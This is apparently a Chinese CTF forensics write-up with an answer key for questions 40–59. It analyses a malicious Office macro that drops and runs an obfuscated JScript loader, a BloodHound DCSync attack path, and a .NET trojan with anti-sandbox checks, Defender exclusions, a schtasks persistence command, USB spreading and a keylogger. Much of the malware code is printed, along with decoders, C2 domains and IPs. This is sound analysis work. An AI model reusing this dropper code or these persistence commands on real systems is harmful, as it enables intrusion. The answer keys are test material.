+使用 Hex 编辑器查看后发现是 OLE 格式的 Office 文档:
+使用
+DidierStevens/DidierStevensSuite
+中的 oledump 工具查看文档中流的信息:
+40 接上题，混淆代码的解密密钥是什么？
+¶
+【答案格式：填写传入脚本的实际密钥，不包含命令行分隔空格】
+答案
+EzZETcSXyKAdF_e5I2i1
+使用 OfficeMalScanner dump VBA 代码:
+导出后查看
+Module1
+. 首先看到定义了一个函数
+Q7JOhn5pIl648L6V43V
+, 功能是对一个字节数组进行 XOR :
+Text Only
+Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
+Dim THQNfU76nlSbtJ5nX8LY6 As Byte
+THQNfU76nlSbtJ5nX8LY6 = 45
+For i = 0 To M5wI32R3VF2g5B21EK4d - 1
+EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
+THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
+Next i
+Q7JOhn5pIl648L6V43V = True
+End Function
+相当于 Python 代码:
+Python
+key
+=
+45
+for
+i
+in
+range
+(
+length
+):
+data
+[
+i
+]
+^=
+key
+key
+=
+((
+key
+^
+99
+)
+^
+(
+i
+%
+254
+))
+&
+0xff
+接着查看
+AutoOpen
+函数, 这一宏会在文档打开时自动执行. 首先获取了当前文档文件大小, 以二进制方式打开当前文档本身
+标号为
+#NEnrKxf8l511
+, 把整个文件内容读入字节数组
+E2kvpmR17SI
+.
+Text Only
+N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
+NEnrKxf8l511 = FreeFile
+Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511
+Dim E2kvpmR17SI() As Byte
+ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
+Get #NEnrKxf8l511, 1, E2kvpmR17SI
+将文档字节数组转成 Unicode 字符串, 并用正则搜索字符串
+MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh
+(作为 payload的定位标志):
+Text Only
+KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
+Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
+VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
+Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
+如果找不到标记, 直接退出; 如果找到, 就取第一个匹配位置
+FirstIndex
+:
+Text Only
+If I4j833DS5SFd34L3gwYQD.Count = 0 Then
+GoTo MnOWqnnpKXfRO
+End If
+For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
+Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
+Exit For
+Next
+分配一个大小为 16828 的字节数组
+Wk4o3X7x1134j
+,从文件偏移
+Y5t4Ul7o385qK4YDhr + 81
+开始读取:
+Text Only
+Dim Wk4o3X7x1134j() As Byte
+Dim KDXl18qY4rcT As Long
+KDXl18qY4rcT = 16827
+ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
+Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
+标记字符串的长度为 80, 紧接着标记字符串开始读取.
+接着解密 payload.
+KDXl18qY4rcT + 1 = 16828
+, 也就是对刚读取的整个数据块做 XOR.
+Text Only
+If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
+GoTo MnOWqnnpKXfRO
+End If
+存储 payload, 优先使用
+%APPDATA%\Microsoft\Windows
+目录; 如果不存在则使用
+%APPDATA%
+目录:
+Text Only
+B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
+Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
+If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
+B8qen2T433Ds1bW = Environ("appdata")
+End If
+Set R7Ks7ug4hRR2weOy7 = Nothing
+把解码后的 payload 写入到
+maintools.js
+文件:
+Text Only
+OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
+Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
+Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
+Close #K764B5Ph46Vh
+执行 JScript 脚本. Windows 会根据文件关联, 由
+wscript.exe
+或
+cscript.exe
+执行 JScript 脚本. 执行时传递了参数
+EzZETcSXyKAdF_e5I2i1
+:
+Text Only
+Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
+R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
+相当于执行了:
+PowerShell
+"<path>\maintools.js"
+EzZETcSXyKAdF_e5I2i1
+根据上述分析, 可以编写一个 Python 脚本, 用于还原 VBA 代码的操作:
+Python
+def
+decode
+(
+data
+):
+key
+=
+45
+out
+=
+bytearray
+(
+data
+)
+for
+i
+in
+range
+(
+len
+(
+out
+)):
+out
+[
+i
+]
+^=
+key
+key
+=
+((
+key
+^
+99
+)
+^
+(
+i
+%
+254
+))
+&
+0xff
+return
+bytes
+(
+out
+)
+marker
+=
+b
+"MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
+with
+open
+(
+"49b367ac261a722a7c2bbbc328c32545"
+,
+"rb"
+)
+as
+f
+:
+blob
+=
+f
+.
+read
+()
+idx
+=
+blob
+.
+find
+(
+marker
+)
+if
+idx
+==
+-
+1
+:
+print
+(
+"marker not found"
+)
+else
+:
+start
+=
+idx
++
+80
+enc
+=
+blob
+[
+start
+:
+start
++
+16828
+]
+dec
+=
+decode
+(
+enc
+)
+with
+open
+(
+"maintools.js"
+,
+"wb"
+)
+as
+f
+:
+f
+.
+write
+(
+dec
+)
+执行 Python 脚本后得到 JS 脚本:
+JavaScript
+try
+{
+var
+wvy1
+=
+WScript
+.
+Arguments
+;
+var
+ssWZ
+=
+wvy1
+(
+0
+);
+var
+ES3c
+=
+y3zb
+();
+ES3c
+=
+LXv5
+(
+ES3c
+);
+ES3c
+=
+CpPT
+(
+ssWZ
+,
+ES3c
+);
+eval
+(
+ES3c
+);
+}
+catch
+(
+e
+)
+{
+WScript
+.
+Quit
+();
+}
+function
+MTvK
+(
+CgqD
+)
+{
+var
+XwH7
+=
+CgqD
+.
+charCodeAt
+(
+0
+);
+if
+(
+XwH7
+===
+0x2B
+||
+XwH7
+===
+0x2D
+)
+return
+62
+if
+(
+XwH7
+===
+0x2F
+||
+XwH7
+===
+0x5F
+)
+return
+63
+if
+(
+XwH7
+<
+0x30
+)
+return
+-
+1
+if
+(
+XwH7
+<
+0x30
++
+10
+)
+return
+XwH7
+-
+0x30
++
+26
++
+26
+if
+(
+XwH7
+<
+0x41
++
+26
+)
+return
+XwH7
+-
+0x41
+if
+(
+XwH7
+<
+0x61
++
+26
+)
+return
+XwH7
+-
+0x61
++
+26
+}
+function
+LXv5
+(
+d27x
+)
+{
+// Base64
+var
+LUK7
+=
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+;
+var
+i
+;
+var
+j
+;
+var
+n6T8
+;
+if
+(
+d27x
+.
+length
+%
+4
+>
+0
+)
+return
+;
+var
+CHlB
+=
+d27x
+.
+length
+;
+var
+V8eR
+=
+d27x
+.
+charAt
+(
+CHlB
+-
+2
+)
+===
+'='
+?
+2
+:
+d27x
+.
+charAt
+(
+CHlB
+-
+1
+)
+===
+'='
+?
+1
+:
+0
+var
+mjqo
+=
+new
+Array
+(
+d27x
+.
+length
+*
+3
+/
+4
+-
+V8eR
+);
+var
+z8Ht
+=
+V8eR
+>
+0
+?
+d27x
+.
+length
+-
+4
+:
+d27x
+.
+length
+;
+var
+t2JG
+=
+0
+;
+function
+XGH6
+(
+b0tQ
+)
+{
+mjqo
+[
+t2JG
+++
+]
+=
+b0tQ
+;
+}
+for
+(
+i
+=
+0
+,
+j
+=
+0
+;
+i
+<
+z8Ht
+;
+i
++=
+4
+,
+j
++=
+3
+)
+{
+n6T8
+=
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
+))
+<<
+18
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+1
+))
+<<
+12
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+2
+))
+<<
+6
+)
+|
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+3
+));
+XGH6
+((
+n6T8
+&
+0xFF0000
+)
+>>
+16
+)
+XGH6
+((
+n6T8
+&
+0xFF00
+)
+>>
+8
+)
+XGH6
+(
+n6T8
+&
+0xFF
+)
+}
+if
+(
+V8eR
+===
+2
+)
+{
+n6T8
+=
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
+))
+<<
+2
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+1
+))
+>>
+4
+)
+XGH6
+(
+n6T8
+&
+0xFF
+)
+}
+else
+if
+(
+V8eR
+===
+1
+)
+{
+n6T8
+=
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
+))
+<<
+10
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+1
+))
+<<
+4
+)
+|
+(
+MTvK
+(
+d27x
+.
+charAt
+(
+i
++
+2
+))
+>>
+2
+)
+XGH6
+((
+n6T8
+>>
+8
+)
+&
+0xFF
+)
+XGH6
+(
+n6T8
+&
+0xFF
+)
+}
+return
+mjqo
+}
+function
+CpPT
+(
+bOe3
+,
+F5vZ
+)
+{
+// RC4
+var
+AWy7
+=
+[];
+var
+V2Vl
+=
+0
+;
+var
+qyCq
+;
+var
+mjqo
+=
+''
+;
+for
+(
+var
+i
+=
+0
+;
+i
+<
+256
+;
+i
+++
+)
+{
+AWy7
+[
+i
+]
+=
+i
+;
+}
+// Initialize S Box
+for
+(
+var
+i
+=
+0
+;
+i
+<
+256
+;
+i
+++
+)
+{
+V2Vl
+=
+(
+V2Vl
++
+AWy7
+[
+i
+]
++
+bOe3
+.
+charCodeAt
+(
+i
+%
+bOe3
+.
+length
+))
+%
+256
+;
+qyCq
+=
+AWy7
+[
+i
+];
+AWy7
+[
+i
+]
+=
+AWy7
+[
+V2Vl
+];
+AWy7
+[
+V2Vl
+]
+=
+qyCq
+;
+}
+// KSA
+var
+i
+=
+0
+;
+var
+V2Vl
+=
+0
+;
+for
+(
+var
+y
+=
+0
+;
+y
+<
+F5vZ
+.
+length
+;
+y
+++
+)
+{
+i
+=
+(
+i
++
+1
+)
+%
+256
+;
+V2Vl
+=
+(
+V2Vl
++
+AWy7
+[
+i
+])
+%
+256
+;
+qyCq
+=
+AWy7
+[
+i
+];
+AWy7
+[
+i
+]
+=
+AWy7
+[
+V2Vl
+];
+AWy7
+[
+V2Vl
+]
+=
+qyCq
+;
+mjqo
++=
+String
+.
+fromCharCode
+(
+F5vZ
+[
+y
+]
+^
+AWy7
+[(
+AWy7
+[
+i
+]
++
+AWy7
+[
+V2Vl
+])
+%
+256
+]);
+}
+// PRGA
+return
+mjqo
+;
+}
+function
+y3zb
+()
+{
+var
+qGxZ
+=
+"zAubgpaJRj0tIneNNZL0wjPqnSRiIygEC/sEWEDJU8LoihPXjdbeiMqcs6AavcLCPXuFM9LJ7svWGgIJKnOOKpe5/T820lsv+DwYnSVB4fKV010kDuEZ/C8wCcWglLQmhMPV8CS6oH/YX8eLiBhN7XZXcixEzi8J1wyMdiI7wD0IKpQoioYV7MP3DsuZk8YxJOkWzoSQVeEuljU2NE4wElYlVZ3bToY8hHW07m4BjZ39zj53vgZX1LQMEG4j4PtoCJZdRN9SUNyY6Y54PCG9SAmHZsz1+v4QpE96O23ckYfzGIvDlwZk9dbZB+6nMSxwl9p1dB8/+u0uNi2mDZ4mwSY4INb4MqbFqRvkNVb36uxW4qM0oCRSpd981PLZk7Y7GOXfZOTGXhIFSJ11ynDo/v3xgPllJSZvFyD3Tw5EE2kemAKI+G1Qdny0ohmeYJO0dhjfOz2HVvEqfyxcDWvhWrCPjB5QS2m78p1R/34DKqbsykWqkZGwNjT31N6S6+XvcZIaHERC11+ePvAo8BR1y9Ldwr999B3Se84xCjfxFNcmFBnDsn6RGigMpH9AfeC4i21XdvrLux3ko40lN1KhVTIpeKoI/U1OfPgzwT8fWJm/J6lzWz/Sby+69/KMWDB+M0UUdVEdL93RkpRkSNQiSBU15sNyM6uAne8ySFN45/fs1zmESctw65YxFzNOwSruCzxb0crp7TdJFcy1c0I16jAN3JkGCovbz+tMoBsRR3MJYMpnO+GwcDKRHsF2JKmG2GhOQDPONnjgGpFeSq78TqTxVOl1uYVZWFDHQKyWGas5jh2Iq3Fx6UhAlmGBG3uMERelUCaUhJ+3nqNReZ+0PJEUXaOjxU6pTCfaWh4d/jDlgFpJLxkpX6ZJmBSWIXv+EOujH5AE66hkWDFjfiMnac0ZA66I1i8Xzl6TUeO9t8Ro8o/N7EnCb3rFkNGIYAo/IhcBx1ikh7M5p45ToLfxwPuvz7J6jWMRa3ROlZDQQGD1PGCjCAyLYPy0E/krYAy5GFje8MpL28xmg+we3E7KXsSaLRTT0TwXG9mvuosfhiLrjIDpcMc4wF2vwtnoBXmL7mO7oEDtpIgOIuZhXGQqLUvfgFY9SLGlqOfgubxSoos3+SrrJjp/GkKPE45ATGv0gB/rS7xx611nt0rCjOYA..."
+;
+// snip
+return
+qGxZ
+;
+}
+熟悉的话可以看出来是 Base64 + RC4, RC4 的密钥是先前传入的
+EzZETcSXyKAdF_e5I2i1
+. 使用 Cyberchef 解密:
+如果看不出来也没有关系, 只需要将代码中的
+JavaScript
+eval
+(
+ES3c
+);
+修改为
+JavaScript
+var
+fso
+=
+new
+ActiveXObject
+(
+"Scripting.FileSystemObject"
+);
+var
+file
+=
+fso
+.
+CreateTextFile
+(
+"output.txt"
+,
+true
+);
+file
+.
+WriteLine
+(
+ES3c
+);
+file
+.
+Close
+();
+即可获取解密后的文件.
+41 接上题，释放并删除的文件是什么？
+¶
+【答案格式：abe.py】
+答案
+maintools.js
+见上述分析.
+42 接上题，该文件用的是什么语言？
+¶
+【答案格式：JavaScript】
+答案
+JScript
+见上述分析.
+43 接上题，分配给命令行参数的变量叫什么名字？
+¶
+【答案格式：abe3】
+答案
+wvy1
+见上述分析.
+脚本第一行中
+var wvy1 = WScript.Arguments;
+保存了命令行参数.
+44 接上题，哪个函数返回下一阶段代码（即第一轮混淆代码）？
+¶
+【答案格式：abe3】
+答案
+y3zb
+见上述分析.
+45 接上题，可以使用哪个 Windows 脚本主机程序在命令行模式下执行该脚本？
+¶
+【答案格式：wscript.exe】
+答案
+cscript.exe
+见上述分析.
+脚本通过命令行执行, 使用的是 cscript; 若通过图形界面运行, 则由 wscript 执行(c: Console; w: Window).
+46 接上题，请提取出所有硬编码的 C2（Command & Control）服务器域名。
+¶
+【答案格式：
+www.baidu.com,www.google.com
+，按照在代码中出现的顺序排序】
+答案
+www.saipadiesel124.com
+,
+www.folk-cantabria
+本题开始需要分析解密后得到的脚本.
+47 接上题，当 C2 服务器返回“work”指令时，脚本下载并执行的最终文件扩展名是什么？
+¶
+【答案格式：exe】
+答案
+pif
+函数
+jSm8
+负责定时获取服务端发送的指令:
+Fv6b
+函数执行了数组
+auME
+中的命令, 将执行结果保存到变量
+c9lr
+中:
+Ysyo
+参数是可用的 c2 服务器地址.
+XEWG
+函数中发送了通过
+Fv6b
+函数获取的主机信息
+c9lr
+:
+指令为
+work
+时执行
+XBL3(Ysyo)
+, 找到
+XBL3
+函数:
+其中
+var YIme = wyKN + LIxF.substring(0, LIxF.length - 2) + "pif";
+构建了一个完整的路径, 最后的脚本将扩展名从
+js
+改为
+pif
+.
+JavaScript
+var
+YIme
+=
+wyKN
++
+LIxF
+.
+substring
+(
+0
+,
+LIxF
+.
+length
+-
+2
+)
++
+"pif"
+;
+var
+wyKN
+=
+Blgx
+(
+bIdG
+());
+function
+Blgx
+(
+gaWo
+)
+{
+wyKN
+=
+"c:\x5cUsers\x5c"
++
+w5mY
++
+"\x5cAppData\x5cLocal\x5cMicrosoft\x5cWindows\x5c"
+;
+if
+(
+!
+QUjy
+.
+FOLDEREXISTS
+(
+wyKN
+))
+wyKN
+=
+"c:\x5cUsers\x5c"
++
+w5mY
++
+"\x5cAppData\x5cLocal\x5cTemp\x5c"
+;
+if
+(
+!
+QUjy
+.
+FOLDEREXISTS
+(
+wyKN
+))
+wyKN
+=
+"c:\x5cDocuments and Settings\x5c"
++
+w5mY
++
+"\x5cApplication Data\x5cMicrosoft\x5cWindows\x5c"
+;
+return
+wyKN
+}
+function
+bIdG
+()
+{
+var
+spq3
+=
+this
+[
+'\u0041\u0063\u0074i\u0076eX\u004F\u0062j\u0065c\u0074'
+];
+// ActiveXObject
+var
+zBVv
+=
+new
+spq3
+(
+'\u0057\u0053cr\u0069\u0070\u0074\u002E\u0053he\u006C\u006C'
+);
+// WScript.Shell
+return
+zBVv
+;
+// ActiveXObject(WScript.Shell)
+}
+var
+LIxF
+=
+WScript
+.
+ScriptName
+;
+48 接上题，如果与 C2 通信失败，脚本会调用哪个函数尝试自毁并清理痕迹？
+¶
+【答案格式：Aabc】
+答案
+tbMu
+见上述分析. 当
+fail
+时, 调用
+tbMu
+函数:
+tbMu
+函数首先删除了脚本, 接着调用任务管理器终止进程, 接着退出脚本执行:
+JavaScript
+function
+tbMu
+()
+{
+QUjy
+.
+DELETEFILE
+(
+WScript
+.
+SCRIPTFULLNAME
+);
+eV_C
+(
+"TaskManager"
+,
+"Windows Task Manager"
+,
+w5mY
+,
+v_FileName
+,
+"EzZETcSXyKAdF_e5I2i1"
+,
+wyKN
+,
+false
+);
+KhDn
+(
+"TaskManager"
+);
+WScript
+.
+Quit
+();
+}
+入侵分析
+¶
+这部分题目可以用早起王 U 盘中 BloodHound 的数据文件
+20260407200233_BloodHound.zip
+分析. Neo4J 数据库中的数据与题目无关.
+50 根据早起王笔录内容，早起王曾经对某企业进行过渗透攻击，请分析域内实体关系，FILESERVER.XIAORANG.LAB 对 XIAORANG.LAB 域拥有什么控制权限？
+¶
+【答案格式：ABCabe】
+答案
+DCSync
+FILESERVER.XIAORANG.LAB
+对域
+XIAORANG.LAB
+拥有目录复制权限, 包括:
+通过
+PrimaryGroupSID = Domain Controllers
+, 继承
+GetChangesAll
+权限.
+通过显式属于
+Enterprise Domain Controllers
+, 继承
+GetChanges
+和
+GetChangesInFilteredSet
+权限.
+以上权限分别记录在
+20260407200233_domains.json
+中的
+PrincipalSID = ...-516，RightName = GetChangesAll
+,
+PrincipalSID = XIAORANG.LAB-S-1-5-9，RightName = GetChanges
+和
+PrincipalSID = XIAORANG.LAB-S-1-5-9，RightName = GetChangesInFilteredSet
+.
+这 3 个权限组合起来, 等价于可对域执行 DCSync.
+51 根据早起王笔录内容，早起王在渗透过程中已成功控制 ZHANGXIN.XIAORANG.LAB，请结合域内实体关系图分析，早起王获取域控权限的完整攻击轨迹是什么？
+¶
+【答案格式：XXXXXXXXXXXXXXX.XXX->XXXXXXXXXX.XXXXXXX.XXX->XXXXXXXX.XXX】
+答案
+ZHANGXIN@XIAORANG.LAB->FILESERVER.XIAORANG.LAB->XIAORANG.LAB
+在已经控制
+ZHANGXIN@XIAORANG.LAB
+的前提下, 最直接的域控提权轨迹是:
+Text Only
+ZHANGXIN@XIAORANG.LAB
+-- MemberOf ->
+ACCOUNT OPERATORS@XIAORANG.LAB
+-- GenericAll ->
+FILESERVER.XIAORANG.LAB
+-- PrimaryGroupSID = DOMAIN CONTROLLERS -->
+-- MemberOf ENTERPRISE DOMAIN CONTROLLERS -->
+-- GetChangesAll / GetChanges / GetChangesInFilteredSet -->
+XIAORANG.LAB
+-- DCSync -->
+Administrator / krbtgt
+-> 域控权限
+WinPE 逆向 (.NET)
+¶
+53 早起王曾给倩倩发送过一封钓鱼邮件，请找到并计算附件 MD5 值。
+¶
+【答案格式：字母不区分大小写】
+答案
+5436b61ea58adb794804e3f18ce53f2a
+在倩倩的 PC 检材的网易邮箱大师分析结果中可以看到一封带有附件的邮件, 邮件伪造为"海母牛公司"的 VPN 部署通知, 但发件地址是早起王的个人邮箱
+zqw100860312@163.com
+:
+邮件正文中提及到附件解压密码为
+haimuniu666
+. 导出邮件附件并使用该密码解压, 火绒直接报毒了:
+计算压缩包 MD5 哈希值:
+54 接上题，编译木马使用的 .NET 版本是多少？
+¶
+【答案格式：1.1.45141】
+答案
+4.0.30319
+DIE 扫一下, 看到 .NET 的版本:
+55 接上题，木马中有多少反沙箱和反调试的检测逻辑？
+¶
+【答案格式：6】
+本题存疑
+官方答案: 5
+我的答案: 3
+使用 dnSpyEx 加载程序, 可以看到程序的入口点为
+Stub.oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.8CBqemw89u44xYPchu85qRf8t1Kb7MrSwSSHdIK7O7VNarcvrvMnWLsldBYa
+. 该恶意软件伪装成 Adobe 软件的安装包:
+跟进入口点之后, 会看到一堆相似的处理:
+跟进类
+NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq
+, 可以看到类的作用就是声明了一堆字符串和常数:
+将该类重命名为
+statics
+. 继续查看对字符串进行处理的方法
+yEA8oSg5e02FNWc6DpGE.f5Mo9y1FK1yJy4poW9CE
+:
+进行了 AES 解密, 模式为 ECB, 密钥为
+array
+字节数组, 由以下代码生成:
+C#
+byte
+[]
+array
+=
+new
+byte
+[
+32
+];
+byte
+[]
+array2
+=
+md5CryptoServiceProvider
+.
+ComputeHash
+(
+ACX0qTJzEzq40qP5qFxb
+.
+wVkaAAeCf6BeWi8Flwtq
+(
+statics
+.
+DhMybcleyUJ8bZbaqtAkL3FTz6SQ840xELBsFWt9yekNCVYQ1WgRtjL1bTF3
+));
+Array
+.
+Copy
+(
+array2
+,
+0
+,
+array
+,
+0
+,
+16
+);
+Array
+.
+Copy
+(
+array2
+,
+0
+,
+array
+,
+15
+,
+16
+);
+方法
+ACX0qTJzEzq40qP5qFxb.wVkaAAeCf6BeWi8Flwtq
+是
+UTF8.GetBytes
+. Key 就是将
+statics.DhMybcleyUJ8bZbaqtAkL3FTz6SQ840xELBsFWt9yekNCVYQ1WgRtjL1bTF3 = "8xTJ0EKPuiQsJVaT"
+的 MD5 值进行拼接:
+Python
+import
+base64
+import
+hashlib
+from
+Crypto.Cipher
+import
+AES
+from
+Crypto.Util.Padding
+import
+unpad
+def
+decrypt
+(
+secret
+:
+str
+,
+ciphertext_b64
+:
+str
+)
+->
+str
+:
+md5
+=
+hashlib
+.
+md5
+(
+secret
+.
+encode
+(
+"utf-8"
+))
+.
+digest
+()
+key
+=
+bytearray
+(
+32
+)
+key
+[
+0
+:
+16
+]
+=
+md5
+# 前 15 字节为 md5 的前 15 字节
+key
+[
+15
+:
+31
+]
+=
+md5
+# 第 16 字节到 31 字节为 md5 的 16 字节
+# 第 32 字节为空字节 '\x00'
+cipher
+=
+AES
+.
+new
+(
+bytes
+(
+key
+),
+AES
+.
+MODE_ECB
+)
+ciphertext
+=
+base64
+.
+b64decode
+(
+ciphertext_b64
+)
+plaintext
+=
+unpad
+(
+cipher
+.
+decrypt
+(
+ciphertext
+),
+16
+)
+return
+plaintext
+.
+decode
+(
+"utf-8"
+)
+将所有的字符串进行解密, 并将变量名修改为解密后的字符串:
+对其他已知变量和已知功能的方法\类进行重命名之后的入口方法:
+接着
+ACX0qTJzEzq40qP5qFxb.6NEoy1ymZv4FH17VRKK3
+方法设置了一个 Mutex, 作用不太清楚.
+接着分析
+Main.AuPSZXXVSMF0DQRCvC2rt5MfcrYC48o7KO1SI69og2JLhf02Th6Xma2HOysY
+方法:
+该方法中嵌套进行了多个判断, 依次来看.
+Main.Mi6spCUvppp4DtgyuvMzJhDBJsveVBG9zeD8c1kQXdScZVgnMViFJzIwncYfWRaCuUs0darWmS0uW4ndY5RkKqmDAG78
+方法:
+该方法通过
+ManagementObjectSearcher
+获取了计算机型号信息, 并判断生产商信息中是否包含
+VIRTUAL
+,
+qemu
+及
+VirtualBox
+字样, 进行虚拟机检测.
+Main.ekfERkJzvPUVc9xQ7RadvF87hIVFUbAaixRJaKzHcRjz6UQErCZPPcp2QVwluQOmYuWHUC5yKellGaX2R5rdbv4oYJoe
+方法:
+该方法通过 WindowsAPI 的
+CheckRemoteDebuggerPresent
+检测了远程调试器是否附加在进程上.
+Main.2roByDJH6ZwpyyMdfAo4PFI3PqRqzn0PSxC5Zg4kzrh6PUEFGOozNDZH3SKF4M1wI6K9GZ1nL6cPaKJJYpNJSKRzaheb
+方法:
+通过是否加载了模块
+SbieDll.dll
+来判断是否运行了 Sandboxie.
+Main.nIHJ1ssdguWOmBZEjwm4ZTWC6RpznK4TffpH05TZr9zRIsVfLweHMOElWw68
+方法:
+判断了 Windows 系统版本是否为 XP.
+Main.pP3jQ2G5fRQOBkR4RuG4ivhEGAqezIt7vqpAJDH5RetSUjBUu1dokMPle3i3
+方法:
+访问
+http://ip-api.com/line/?fields=hosting
+获取 IP 类别是否为
+hosting
+(机房、云服务商、代理、托管网络等).
+对方法进行重命名之后:
+但是, 这道题官方给出的答案是 5, 即认为上述的 5 个检测均为反沙箱和反调试的检测. 但实际上,
+is_xp
+和
+is_hosting
+并不属于此类检测, 后者作用应该是勒索软件的作者希望攻击服务器之类具有价值的目标.
+56 接上题，木马为获得提权执行而创建的计划任务名称是什么？
+¶
+【答案格式：Netlogon】
+答案
+WmiPrvSE
+接上题分析过程.
+EntryPoint
+接着执行了
+Main.j4d5GNXICPEVRtyjnlgCMXk7jToiY6J1mAs5nLQFxfcp708CM7Hr1XTxfCBg
+方法, 继续跟进:
+先判断了当前用户是否具有管理员权限:
+接着拼接并运行了 4 条 Powershell 的指令.
+ACX0qTJzEzq40qP5qFxb.8qqIc9C1rZ7T3TBLTgSV
+是当前进程主模块(恶意程序)的文件全路径名. 4 条指令为当前运行的恶意程序和
+WmiPrvSE.exe
+设置了临时绕过执行策略并加入了 Windows Defender 的白名单.
+EntryPoint
+接着将恶意程序复制到了
+%AppData%/WmiPrvSE.exe
+:
+接着通过
+schtasks.exe
+设置了定时任务:
+PowerShell
+schtasks
+.
+exe
+/
+create
+/
+f
+/
+RL
+HIGHEST
+/
+sc
+minute
+/
+mo
+1
+/
+tn
+"WmiPrvSE"
+/
+tr
+"%AppData%/WmiPrvSE.exe"
+57 接上题，木马使用哪种加密算法来加密或混淆其配置数据？
+¶
+【答案格式：BASE64】
+答案
+AES256
+参考上述分析. Key 长度为
+16 * 2 = 32 Bytes
+, 为 AES-256.
+58 接上题，为了获取其加密算法的某个参数，木马使用一个硬编码字符串作为输入。这个硬编码字符串的值是多少？
+¶
+【答案格式：uwbf4wNfw】
+答案
+8xTJ0EKPuiQsJVaT
+参考上述分析.
+59 接上题，木马回连的 IP 地址有哪些？
+¶
+【答案格式：按木马中原始顺序写入，逗号分隔，如：114.114.114.114,8.8.8.8,1.1.1.1】
+答案
+156.238.239.253,66.175.239.149,185.117.249.43
+参考上述分析.
+接着
+EntryPoint
+通过添加注册表项将恶意程序加入开机自启动项:
+接着
+EntryPoint'
+又通过将快捷方式添加到
+Startup
+目录让恶意程序开机自启动:
+接着
+EntryPoint
+执行
+VRti6vhPYugo9GdL3aQYj2eDRdhSfKIazXyfNr18qkYGBHO0iTkiZoRtMwtI7vEZAaW8tYfk5m7J2.oXAUverEkn3LAFv6enuVZPjP25NAIAb6gydo8yzlQ3nHid4F58NM7IcXiFXorwNtYk82lvGcvQeSQ
+方法, 跟进:
+创建并执行 1 个新线程
+skco5JdZwVCJmKyZP2mBQOKKGvSMDri6CQ5947iKrcNK4qGAYOxHip41mL5c7UOEe1GuUXdIMZ2iG
+, 线程执行了方法
+VRti6vhPYugo9GdL3aQYj2eDRdhSfKIazXyfNr18qkYGBHO0iTkiZoRtMwtI7vEZAaW8tYfk5m7J2.8JW8sctAWP3goappjN57CJl2TLWyKcTw2ZYwj5rr18XOfs8ItKA8LpXmObthOBfOKEBBELi8RAE3J
+. 该方法较为复杂, 主要实现的功能是:
+通过
+wscript.shell
+来快捷方式;
+修改注册表, 关闭资源管理器的"显示受保护的操作系统文件"(ShowSuperHidden)功能;
+枚举所有驱动器, 并将自身复制到可移动磁盘根目录的
+USB.exe
+并设置属性
+Hidden | System
+;
+遍历可移动磁盘根目录, 对
+USB.exe
+以外的文件设置属性
+Hidden | System
+并创建同名快捷方式, 快捷方式先后启动恶意程序, 后打开原文件.;
+遍历可移动磁盘根目录, 对文件夹设置属性
+Hidden | System
+并创建同名快捷方式, 快捷方式先运行恶意程序, 再打开原目录;
+Thread.Sleep(5000)
+.
+接着
+EntryPoint
+执行
+ACX0qTJzEzq40qP5qFxb.t93znx36c8iu2Asm9DOL
+方法, 设置了线程运行状态.
+接着
+EntryPoint
+运行新线程
+Main.QHt7a40ajKLMcV6MPMBFs7AqBMWMzEVp5ZapjKf2wHZY5q13UGzla615Vp7ngNI0gOBHgNACfKiPSedl1Rme7AYQUpzp
+方法, 是键盘记录器:
+跟进
